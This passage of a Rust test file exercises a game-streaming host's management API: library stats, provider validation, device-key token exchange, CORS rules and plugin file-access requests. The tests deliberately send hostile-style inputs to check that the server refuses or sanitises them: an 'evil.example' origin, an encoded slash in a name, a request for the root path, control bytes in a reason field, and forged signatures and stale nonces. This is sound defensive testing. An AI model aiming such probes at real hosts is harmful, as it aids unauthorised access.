            // Not a `HiddenToggle` — rejected before the handler runs.
            .body(Body::from(serde_json::json!({"nope": 1}).to_string()))
            .unwrap()
    };

    for id in ["steam:70", "custom:abc", "heroic:legendary:fc0b13b7"] {
        let (s, json) = send(&app, put(id)).await;
        assert_ne!(
            s,
            StatusCode::NOT_FOUND,
            "`{id}` must ROUTE — a colon is a legal path character and every library id has one: {json}"
        );
        assert!(
            s.is_client_error(),
            "a body that is not a HiddenToggle must be refused, not accepted: {s} {json}"
        );
    }
}

/// Stats ride on the entry: absent until the first launch, then the four numbers as recorded.
/// The env override must cover the whole body (`paired_clients_list_and_unpair`).
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn library_stats_ride_on_the_entry() {
    let _tmp = ConfigDirOverride::new();
    let app = test_app(test_state(), None);
    let added = crate::library::add_custom(crate::library::CustomInput {
        title: "Chrono Trigger".into(),
        art: Default::default(),
        launch: None,
        prep: None,
        role: Default::default(),
        icon: None,
        detect: None,
        on_window: None,
        audio: None,
        meta: Default::default(),
    })
    .expect("seed one custom title");
    let id = crate::library::library_id_for(&added);

    let (s, json) = send(&app, get_req("/api/v1/library")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(json[0]["id"], id.as_str());
    assert!(
        json[0].get("stats").is_none(),
        "a never-launched title carries no stats key: {json}"
    );

    crate::library::record_launch(&id);
    crate::library::record_run_time(&id, std::time::Duration::from_millis(1_500));
    crate::library::record_run_time(&id, std::time::Duration::from_millis(500));
    // A run credited to an id with no entry is kept but never surfaces.
    crate::library::record_run_time("steam:404", std::time::Duration::from_secs(1));

    let (s, json) = send(&app, get_req("/api/v1/library")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(json.as_array().map(Vec::len), Some(1), "{json}");
    let stats = &json[0]["stats"];
    assert_eq!(stats["launch_count"], 1, "{json}");
    assert_eq!(stats["play_time_ms"], 2_000);
    assert_eq!(stats["last_run_ms"], 2_000);
    assert!(stats["last_played_unix_ms"]
        .as_u64()
        .is_some_and(|ms| ms > 0));
}

/// The lease watcher credits a recorded launch's run: seen running, then gone, lands on disk.
/// Launches are counted by the planes, never by the lease — the count stays zero here.
#[cfg(target_os = "linux")]
#[test]
#[ignore = "drives a real process for ~12s (shim window + exit confirmation)"]
fn a_recorded_launch_credits_its_run_to_the_library_stats() {
    use std::os::unix::process::CommandExt;
    let tmp = ConfigDirOverride::new();
    let script = tmp.path().join("game.sh");
    std::fs::write(&script, "#!/bin/sh\nexec sleep 30\n").unwrap();
    let launch_stamp = crate::gamelease::launch_clock();
    let child = std::process::Command::new("/bin/sh")
        .arg(&script)
        .process_group(0)
        .spawn()
        .expect("spawn the fake game");

    let lease = crate::gamelease::open(
        crate::gamelease::LeaseRequest {
            game: crate::gamelease::GameRef {
                id: Some("custom:stats-run".into()),
                store: Some("custom".into()),
                title: "Stats Run".into(),
            },
            client: "test".into(),
            fingerprint: None,
            plane: crate::events::Plane::Native,
            spec: crate::library::DetectSpec::dir(tmp.path()),
            nested: false,
            scope_pid: None,
            launcher: false,
            child: Some((child, true)),
            spawned: None,
            launch_stamp,
            // Recorded: this is what makes the run count.
            procs: Some(std::sync::Arc::new(std::sync::Mutex::new(Vec::new()))),
            #[cfg(target_os = "linux")]
            workspace: None,
            window: None,
            outcome: None,
        },
        Box::new(|| {}),
    );
    let shared = lease.shared();
    let wait_for = |state: crate::gamelease::GameState, secs: u64| {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(secs);
        while std::time::Instant::now() < deadline && shared.state() != state {
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert_eq!(shared.state(), state);
    };
    // Past the shim window the child is the game.
    wait_for(crate::gamelease::GameState::Running, 15);
    crate::gamelease::terminate(shared.clone(), "test asked");
    wait_for(crate::gamelease::GameState::Exited, 30);

    let stats = crate::library::game_stats();
    let s = stats.get("custom:stats-run").expect("the run was credited");
    assert!(s.play_time_ms >= 500, "seen running for a while: {s:?}");
    assert_eq!(s.last_run_ms, s.play_time_ms, "one run: {s:?}");
    assert_eq!(s.launch_count, 0, "the lease never counts launches: {s:?}");
    assert_eq!(s.last_played_unix_ms, 0);
}

// ------------------------------------------------------------------ library providers

/// Validation only; a successful PUT would touch the real catalog (`library::custom` covers writes).
#[tokio::test]
async fn provider_reconcile_validation() {
    let app = test_app(test_state(), None);
    let put = |provider: &str, body: serde_json::Value| {
        axum::http::Request::put(format!("/api/v1/library/provider/{provider}"))
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let (s, json) = send(&app, put("manual", serde_json::json!([]))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(json["error"].as_str().unwrap().contains("reserved"));
    let (s, _) = send(&app, put("Bad%2FName", serde_json::json!([]))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    let (s, _) = send(
        &app,
        put(
            "romm",
            serde_json::json!([{"external_id": "", "title": "X"}]),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    let (s, json) = send(
        &app,
        put(
            "romm",
            serde_json::json!([
                {"external_id": "a", "title": "A"},
                {"external_id": "a", "title": "B"}
            ]),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(json["error"].as_str().unwrap().contains("duplicate"));

    let del = axum::http::Request::delete("/api/v1/library/provider/manual")
        .body(Body::empty())
        .unwrap();
    let (s, _) = send(&app, del).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

/// The plugin runner starts every store at once, so their first syncs land together.
#[test]
fn concurrent_provider_syncs_keep_every_row() {
    let _dir = ConfigDirOverride::new();
    std::thread::scope(|s| {
        for p in 0..8 {
            s.spawn(move || {
                for _ in 0..20 {
                    let row = serde_json::json!({"external_id": "a", "title": "A"});
                    let inputs = vec![serde_json::from_value(row).unwrap()];
                    crate::library::reconcile_provider(&format!("p{p}"), None, inputs)
                        .expect("sync saved");
                }
            });
        }
    });
    let rows = crate::library::load_custom();
    assert_eq!(rows.len(), 8, "one row per provider: {rows:?}");
}

/// Unknown titles are counted, not refused: a report races its own reconcile, and 400-ing
/// the whole report would drop every other running title. Catalog is untouched, so every
/// id here is unknown by construction.
#[tokio::test]
async fn provider_running_report_validation() {
    let app = test_app(test_state(), None);
    let put = |provider: &str, body: serde_json::Value| {
        axum::http::Request::put(format!("/api/v1/library/provider/{provider}/running"))
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let (s, json) = send(&app, put("manual", serde_json::json!({"running": []}))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(json["error"].as_str().unwrap().contains("reserved"));
    let (s, _) = send(&app, put("Bad%2FName", serde_json::json!({"running": []}))).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    // Unreported provider: a legitimate "nothing is running".
    let (s, json) = send(&app, put("playnite", serde_json::json!({"running": []}))).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(json["matched"], 0);
    assert_eq!(json["unknown"], 0);
    assert!(json["ttl_s"].as_u64().unwrap() > 0);

    let (s, json) = send(
        &app,
        put(
            "playnite",
            serde_json::json!({"running": [{"external_id": "no-such-title", "pid": 4242}]}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(json["matched"], 0);
    assert_eq!(json["unknown"], 1);

    // A report of unpublished titles must not hold a real lease open.
    assert!(!crate::runstate::speaks_for(Some("playnite:no-such-title")));
    crate::runstate::forget("playnite");
}

/// The browser's whole route into the management API: challenge, sign, exchange, then use the
/// token on the paired-device lane — and be refused everywhere that lane does not reach.
///
/// The signature is made with a real P-256 key over `auth_signed_message`, the same function the
/// control stream uses, so a divergence between the two shows up here rather than against a live
/// browser.
#[tokio::test]
async fn a_paired_device_key_buys_the_cert_lane_and_no_more() {
    use base64::Engine as _;
    use rcgen::{KeyPair, PublicKeyData as _, SigningKey as _, PKCS_ECDSA_P256_SHA256};

    let b64 = base64::engine::general_purpose::STANDARD;
    let path = std::env::temp_dir().join(format!("pf-mgmt-device-{}.json", std::process::id()));
    let _ = std::fs::remove_file(&path);
    let np =
        Arc::new(crate::native_pairing::NativePairing::load_with(Some(path), None, false).unwrap());
    let key = KeyPair::generate_for(&PKCS_ECDSA_P256_SHA256).unwrap();
    let spki = key.subject_public_key_info();
    let fp: String = crate::webtransport::sha256(&spki)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    let app = test_app_native(test_state(), np.clone());

    // The exchange, as the page runs it.
    let exchange = |body: serde_json::Value| {
        let app = app.clone();
        async move {
            let req = axum::http::Request::post("/api/v1/auth/device/token")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap();
            // No bearer: this route is reached without a credential, which is the point.
            let res = app.oneshot(req).await.unwrap();
            let status = res.status();
            let bytes = res.into_body().collect().await.unwrap().to_bytes();
            (
                status,
                serde_json::from_slice::<serde_json::Value>(&bytes).unwrap(),
            )
        }
    };
    let challenge = || {
        let app = app.clone();
        async move {
            let req = axum::http::Request::post("/api/v1/auth/device/challenge")
                .body(Body::empty())
                .unwrap();
            let res = app.oneshot(req).await.unwrap();
            let bytes = res.into_body().collect().await.unwrap().to_bytes();
            let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
            v["nonce"].as_str().unwrap().to_string()
        }
    };
    let signed = |nonce: &str| {
        let raw: Vec<u8> = (0..64)
            .step_by(2)
            .map(|i| u8::from_str_radix(&nonce[i..i + 2], 16).unwrap())
            .collect();
        let mut n = [0u8; 32];
        n.copy_from_slice(&raw);
        // `[0x5a; 32]` is the binding `test_app_native` installs as the host identity.
        b64.encode(
            key.sign(&punktfunk_core::quic::auth_signed_message(&[0x5a; 32], &n))
                .unwrap(),
        )
    };

    // Unpaired: a perfect signature buys nothing.
    let nonce = challenge().await;
    let (status, _) = exchange(serde_json::json!({
        "device_key": b64.encode(&spki),
        "nonce": nonce,
        "signature": signed(&nonce),
    }))
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "not paired yet");

    np.add("Browser", &fp).unwrap();

    // A stale nonce is refused, and the refusal is indistinguishable from any other.
    let (status, _) = exchange(serde_json::json!({
        "device_key": b64.encode(&spki),
        "nonce": "ff".repeat(32),
        "signature": signed(&"ff".repeat(32)),
    }))
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a nonce we never issued");

    // A live nonce with the wrong signature burns that nonce anyway.
    let nonce = challenge().await;
    let (status, _) = exchange(serde_json::json!({
        "device_key": b64.encode(&spki),
        "nonce": nonce,
        "signature": b64.encode([7u8; 70]),
    }))
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a bad signature");
    let (status, _) = exchange(serde_json::json!({
        "device_key": b64.encode(&spki),
        "nonce": nonce,
        "signature": signed(&nonce),
    }))
    .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "and the nonce is spent");

    // The real thing.
    let nonce = challenge().await;
    let (status, grant) = exchange(serde_json::json!({
        "device_key": b64.encode(&spki),
        "nonce": nonce,
        "signature": signed(&nonce),
    }))
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(grant["fingerprint"].as_str(), Some(fp.as_str()));
    let token = grant["token"].as_str().unwrap().to_string();

    let with_token = |path: &str| {
        let (app, token) = (app.clone(), token.clone());
        let path = path.to_string();
        async move {
            let req = axum::http::Request::get(&path)
                .header("authorization", format!("Bearer {token}"))
                .body(Body::empty())
                .unwrap();
            app.oneshot(req).await.unwrap().status()
        }
    };
    // Exactly the paired-device set: the library it came for, and not the roster that names
    // every other device.
    assert_eq!(with_token("/api/v1/library").await, StatusCode::OK);
    assert_eq!(with_token("/api/v1/status").await, StatusCode::OK);
    assert_ne!(
        with_token("/api/v1/native/clients").await,
        StatusCode::OK,
        "a device token must not reach the admin lane"
    );

    // Unpairing revokes at once, rather than when the token lapses.
    np.remove(&fp).unwrap();
    assert_ne!(
        with_token("/api/v1/library").await,
        StatusCode::OK,
        "the store is re-read on every request"
    );
}

/// The second wall in front of a browser, after the certificate one. A preflight has to be
/// answered without a credential — `require_auth` would correctly refuse it — and the answer
/// must never claim credentials are allowed.
#[tokio::test]
async fn a_preflight_is_answered_and_never_allows_credentials() {
    use axum::http::header;

    let app = test_app_browser(test_state());
    let preflight = axum::http::Request::builder()
        .method("OPTIONS")
        .uri("/api/v1/library")
        .header(header::ORIGIN, "https://web.punktfunk.io")
        .header(header::ACCESS_CONTROL_REQUEST_METHOD, "GET")
        .header(header::ACCESS_CONTROL_REQUEST_HEADERS, "authorization")
        .body(Body::empty())
        .unwrap();
    let res = app.clone().oneshot(preflight).await.unwrap();
    assert_eq!(
        res.status(),
        StatusCode::NO_CONTENT,
        "answered, not refused"
    );
    let h = res.headers();
    assert_eq!(
        h.get(header::ACCESS_CONTROL_ALLOW_ORIGIN).unwrap(),
        "https://web.punktfunk.io"
    );
    assert!(
        h.get(header::ACCESS_CONTROL_ALLOW_HEADERS)
            .unwrap()
            .to_str()
            .unwrap()
            .contains("authorization"),
        "the header that makes a preflight happen at all"
    );
    assert!(
        h.get(header::ACCESS_CONTROL_ALLOW_CREDENTIALS).is_none(),
        "no ambient authority: see mgmt::cors"
    );

    // A real request carries the header too, or the browser discards the response it just got.
    let mut req = get_req("/api/v1/host");
    req.headers_mut()
        .insert(header::ORIGIN, "https://web.punktfunk.io".parse().unwrap());
    let res = app.clone().oneshot(req).await.unwrap();
    assert!(res
        .headers()
        .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
        .is_some());

    // A caller that sent no Origin is not a browser, and its response is left exactly as it was.
    let res = app.oneshot(get_req("/api/v1/health")).await.unwrap();
    assert!(res
        .headers()
        .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
        .is_none());
}

/// `/local/summary` is admitted by network position alone, so the same-origin policy was the
/// only thing keeping a page off it. A host that serves browsers must still not stamp it: a
/// page on a machine that trusts the host certificate reaches loopback like anything else.
#[tokio::test]
async fn the_loopback_lane_is_never_readable_cross_origin() {
    use axum::http::header;

    let app = test_app_browser(test_state());
    let origin = "https://evil.example";

    let preflight = axum::http::Request::builder()
        .method("OPTIONS")
        .uri("/api/v1/local/summary")
        .header(header::ORIGIN, origin)
        .header(header::ACCESS_CONTROL_REQUEST_METHOD, "GET")
        .body(Body::empty())
        .unwrap();
    let res = app.clone().oneshot(preflight).await.unwrap();
    assert!(
        res.headers()
            .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
            .is_none(),
        "a preflight here would tell a page it is welcome to try"
    );

    let mut req = get_req("/api/v1/local/summary");
    req.headers_mut()
        .insert(header::ORIGIN, origin.parse().unwrap());
    let res = app.oneshot(req).await.unwrap();
    assert_eq!(res.status(), StatusCode::OK, "loopback still reads it");
    assert!(
        res.headers()
            .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
            .is_none(),
        "served, but the browser must discard it"
    );
}

/// The browser plane is off by default, so the headers that exist to serve it must be too.
/// Otherwise every host starts answering cross-origin on an upgrade, for a plane nobody enabled.
#[tokio::test]
async fn a_host_with_no_browser_plane_stamps_nothing() {
    use axum::http::header;

    let app = test_app(test_state(), None);
    let mut req = get_req("/api/v1/host");
    req.headers_mut()
        .insert(header::ORIGIN, "https://web.punktfunk.io".parse().unwrap());
    let res = app.clone().oneshot(req).await.unwrap();
    assert!(res
        .headers()
        .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
        .is_none());

    // And the preflight is not answered either — `require_auth` refuses it, as it did before.
    let preflight = axum::http::Request::builder()
        .method("OPTIONS")
        .uri("/api/v1/library")
        .header(header::ORIGIN, "https://web.punktfunk.io")
        .header(header::ACCESS_CONTROL_REQUEST_METHOD, "GET")
        .body(Body::empty())
        .unwrap();
    let res = app.oneshot(preflight).await.unwrap();
    assert_ne!(res.status(), StatusCode::NO_CONTENT, "no CORS answer");
}

/// The stored row's `detect` and `prep` come back on the operator lane, and an update that
/// omits them keeps them — the console form never showed them and used to clear them on
/// every save (#1064). Sending the field, even empty, still replaces it.
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn custom_entry_hints_round_trip_and_survive_an_update() {
    let _tmp = ConfigDirOverride::new();
    let app = test_app(test_state(), None);
    let added = crate::library::add_custom(crate::library::CustomInput {
        title: "Eden".into(),
        art: Default::default(),
        launch: None,
        prep: Some(vec![crate::hooks::PrepCmd {
            run: "true".into(),
            undo: None,
        }]),
        role: Default::default(),
        icon: None,
        detect: Some(crate::library::DetectHint {
            exe: Some("/usr/bin/eden".into()),
            ..Default::default()
        }),
        on_window: None,
        audio: None,
        meta: Default::default(),
    })
    .expect("seed one custom title");
    let path = format!("/api/v1/library/custom/{}", added.id);

    let (s, json) = send(&app, get_req(&path)).await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json["detect"]["exe"], "/usr/bin/eden");
    assert_eq!(json["prep"][0]["do"], "true");

    let (s, json) = send(
        &app,
        put_json(&path, serde_json::json!({ "title": "Eden II" })),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    let (_, json) = send(&app, get_req(&path)).await;
    assert_eq!(json["title"], "Eden II");
    assert_eq!(
        json["detect"]["exe"], "/usr/bin/eden",
        "omitted detect is kept: {json}"
    );
    assert_eq!(
        json["prep"][0]["do"], "true",
        "omitted prep is kept: {json}"
    );

    let body = serde_json::json!({ "title": "Eden II", "detect": {}, "prep": [] });
    let (s, json) = send(&app, put_json(&path, body)).await;
    assert_eq!(s, StatusCode::OK, "{json}");
    let (_, json) = send(&app, get_req(&path)).await;
    assert!(
        json.get("detect").is_none(),
        "an explicit empty hint clears it: {json}"
    );
    assert!(
        json.get("prep").is_none(),
        "an explicit empty list clears it: {json}"
    );

    let (s, _) = send(&app, get_req("/api/v1/library/custom/nonesuch")).await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

// ---- plugin access requests --------------------------------------------------------------------

/// An app whose access store lives in `access_dir`, with a second identified plugin (`other`)
/// beside `demo` so ownership can be checked both ways. The requested dir must exist.
fn test_app_access(state: Arc<AppState>, access_dir: &std::path::Path) -> Router {
    let stats = state.stats.clone();
    app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        shared_plugin_tokens(std::collections::BTreeMap::from([
            ("demo".to_string(), "demo-secret".to_string()),
            ("other".to_string(), "other-secret".to_string()),
        ])),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        access_dir.to_path_buf(),
        false,
        None,
        false,
    )
}

fn bearer_req(req: axum::http::Request<Body>, token: &str) -> axum::http::Request<Body> {
    let mut req = req;
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_str(&format!("Bearer {token}")).unwrap(),
    );
    req
}

/// The next `plugins.changed` for `id`, failing on timeout. Subscribe BEFORE the call so the
/// event cannot race past the receiver.
async fn expect_plugins_changed(
    mut rx: tokio::sync::broadcast::Receiver<crate::events::HostEvent>,
    id: &str,
) {
    let seen = tokio::time::timeout(std::time::Duration::from_secs(5), async {
        loop {
            if let Ok(ev) = rx.recv().await {
                if let crate::events::EventKind::PluginsChanged { id: got } = ev.kind {
                    if got == id {
                        return;
                    }
                }
            }
        }
    })
    .await;
    assert!(seen.is_ok(), "no plugins.changed for {id} within 5s");
}

/// A request lands pending, the same plugin reads its own rows, and the shared runner token —
/// which carries no plugin identity — gets 403 on both.
#[tokio::test]
async fn plugin_access_request_and_own_rows() {
    let dir = tempfile::tempdir().unwrap();
    let wanted = tempfile::tempdir().unwrap();
    let app = test_app_access(test_state(), dir.path());
    let path = wanted
        .path()
        .canonicalize()
        .unwrap()
        .to_string_lossy()
        .to_string();

    let rx = crate::events::bus().subscribe_live();
    let body = serde_json::json!({ "paths": [{ "path": path }], "reason": "library folder" });
    let (s, json) = send(
        &app,
        bearer_req(
            post_json("/api/v1/plugin-access/requests", body),
            "demo-secret",
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json[0]["outcome"], "pending");
    assert_eq!(json[0]["path"], path);
    // The new row announces itself.
    expect_plugins_changed(rx, "demo").await;

    let (s, json) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access/requests"), "demo-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json["plugin"], "demo");
    assert_eq!(json["pending"][0]["path"], path);
    assert_eq!(json["pending"][0]["reason"], "library folder");

    for req in [
        post_json(
            "/api/v1/plugin-access/requests",
            serde_json::json!({ "paths": [{ "path": path }] }),
        ),
        post_json(
            "/api/v1/plugin-access/requests",
            serde_json::json!({ "paths": [] }),
        ),
    ] {
        let (s, _) = send(&app, bearer_req(req, "plugin-secret")).await;
        assert_eq!(
            s,
            StatusCode::FORBIDDEN,
            "the shared runner token has no identity"
        );
    }
    let (s, _) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access/requests"), "plugin-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
}

/// Another plugin's token sees only its own rows and cannot reach the admin decision.
#[tokio::test]
async fn plugin_access_rows_stay_with_their_plugin() {
    let dir = tempfile::tempdir().unwrap();
    let wanted = tempfile::tempdir().unwrap();
    let app = test_app_access(test_state(), dir.path());
    let path = wanted
        .path()
        .canonicalize()
        .unwrap()
        .to_string_lossy()
        .to_string();

    let (s, _) = send(
        &app,
        bearer_req(
            post_json(
                "/api/v1/plugin-access/requests",
                serde_json::json!({ "paths": [{ "path": path }] }),
            ),
            "demo-secret",
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);

    // `other` gets an empty snapshot, not demo's row.
    let (s, json) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access/requests"), "other-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json["plugin"], "other");
    assert!(json["pending"].as_array().unwrap().is_empty());

    // And no plugin token may decide — demo's own row included.
    let decide = |token: &str| {
        bearer_req(
            post_json(
                "/api/v1/plugin-access/demo/decide",
                serde_json::json!({ "path": path, "decision": "allow" }),
            ),
            token,
        )
    };
    let (s, _) = send(&app, decide("demo-secret")).await;
    assert_eq!(s, StatusCode::FORBIDDEN);
    let (s, _) = send(&app, decide("other-secret")).await;
    assert_eq!(s, StatusCode::FORBIDDEN);
    // The admin overview is likewise off-lane.
    let (s, _) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access"), "demo-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
}

/// Allow turns the pending row into a grant; deny sticks across a rebuilt store; a denied
/// repost answers `denied` and files nothing.
#[tokio::test]
async fn plugin_access_decisions_land_and_stick() {
    let dir = tempfile::tempdir().unwrap();
    let wanted = tempfile::tempdir().unwrap();
    let denied_dir = tempfile::tempdir().unwrap();
    let app = test_app_access(test_state(), dir.path());
    let allow_path = wanted
        .path()
        .canonicalize()
        .unwrap()
        .to_string_lossy()
        .to_string();
    let deny_path = denied_dir
        .path()
        .canonicalize()
        .unwrap()
        .to_string_lossy()
        .to_string();

    let post = |p: &str| {
        bearer_req(
            post_json(
                "/api/v1/plugin-access/requests",
                serde_json::json!({ "paths": [{ "path": p }] }),
            ),
            "demo-secret",
        )
    };
    assert_eq!(send(&app, post(&allow_path)).await.0, StatusCode::OK);
    assert_eq!(send(&app, post(&deny_path)).await.0, StatusCode::OK);

    let rx = crate::events::bus().subscribe_live();
    let (s, json) = send(
        &app,
        post_json(
            "/api/v1/plugin-access/demo/decide",
            serde_json::json!({ "path": allow_path, "decision": "allow" }),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json["grants"][0]["path"], allow_path);
    assert_eq!(json["grants"][0]["by"], "console");
    assert!(json["pending"]
        .as_array()
        .unwrap()
        .iter()
        .all(|p| p["path"] != allow_path));
    expect_plugins_changed(rx, "demo").await;

    let (s, json) = send(
        &app,
        post_json(
            "/api/v1/plugin-access/demo/decide",
            serde_json::json!({ "path": deny_path, "decision": "deny" }),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    assert_eq!(json["denied"], serde_json::json!([deny_path]));

    // Rebuilt store over the same dir: the denial still answers, without a new row.
    let app2 = test_app_access(test_state(), dir.path());
    let (s, json) = send(&app2, post(&deny_path)).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(json[0]["outcome"], "denied");

    // The admin overview lists both verdicts under the plugin.
    let (s, json) = send(&app, get_req("/api/v1/plugin-access")).await;
    assert_eq!(s, StatusCode::OK, "{json}");
    let demo = json
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["plugin"] == "demo")
        .expect("demo row");
    assert_eq!(demo["grants"].as_array().unwrap().len(), 1);
    assert_eq!(demo["denied"], serde_json::json!([deny_path]));

    // Deciding a path that was never asked for is a 404.
    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/plugin-access/demo/decide",
            serde_json::json!({ "path": deny_path, "decision": "allow" }),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

/// A refused path is an answer, not a row; a plugin-authored reason loses its control bytes.
#[tokio::test]
async fn plugin_access_refusals_and_reason_sanitizing() {
    let dir = tempfile::tempdir().unwrap();
    let wanted = tempfile::tempdir().unwrap();
    let app = test_app_access(test_state(), dir.path());
    let path = wanted
        .path()
        .canonicalize()
        .unwrap()
        .to_string_lossy()
        .to_string();

    let (s, json) = send(
        &app,
        bearer_req(
            post_json(
                "/api/v1/plugin-access/requests",
                serde_json::json!({
                    "paths": [
                        { "path": "/" },
                        { "path": "relative/dir" },
                        { "path": path },
                    ],
                    "reason": "games\u{7}\n library"
                }),
            ),
            "demo-secret",
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{json}");
    let outcomes: Vec<&str> = json
        .as_array()
        .unwrap()
        .iter()
        .map(|o| o["outcome"].as_str().unwrap())
        .collect();
    assert_eq!(outcomes[0], "refused:broad_root");
    assert_eq!(outcomes[1], "refused:not_absolute");
    assert_eq!(outcomes[2], "pending");

    let (s, json) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access/requests"), "demo-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    // One row only — the refused paths never became rows — with the controls stripped.
    assert_eq!(json["pending"].as_array().unwrap().len(), 1);
    assert_eq!(json["pending"][0]["reason"], "games library");

    // The cap is in Unicode chars: a longer reason is truncated, not refused.
    let other = tempfile::tempdir().unwrap();
    let (s, _) = send(
        &app,
        bearer_req(
            post_json(
                "/api/v1/plugin-access/requests",
                serde_json::json!({
                    "paths": [{ "path": other.path().canonicalize().unwrap().to_string_lossy() }],
                    "reason": "x".repeat(200)
                }),
            ),
            "demo-secret",
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    let (s, json) = send(
        &app,
        bearer_req(get_req("/api/v1/plugin-access/requests"), "demo-secret"),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    let reasons: Vec<&str> = json["pending"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|p| p["reason"].as_str())
        .collect();
    assert!(reasons.iter().any(|r| r.chars().count() == 120));
}
